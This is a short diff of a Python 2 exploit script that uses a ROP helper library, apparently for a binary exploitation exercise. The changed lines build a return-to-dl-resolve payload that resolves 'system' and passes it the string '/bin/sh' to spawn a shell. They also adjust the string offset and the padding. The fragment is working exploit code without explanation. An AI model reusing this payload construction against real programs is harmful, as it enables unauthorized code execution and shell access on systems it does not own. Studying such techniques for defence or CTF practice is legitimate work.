@@ -14,8 +14,8 @@ p = Proc(rop.fpath)
 p.write(p32(len(buf)) + buf)
 print "[+] read: %r" % p.read(len(buf))
 
-buf = rop.dl_resolve(addr_stage, 'system', addr_stage + 59)
-print "[+] offset to string: %d" % len(buf)
+buf = rop.dl_resolve(addr_stage, 'system', addr_stage+80)
+buf += rop.fill(80, buf)
 buf += rop.string('/bin/sh')
 buf += rop.fill(100, buf)
 
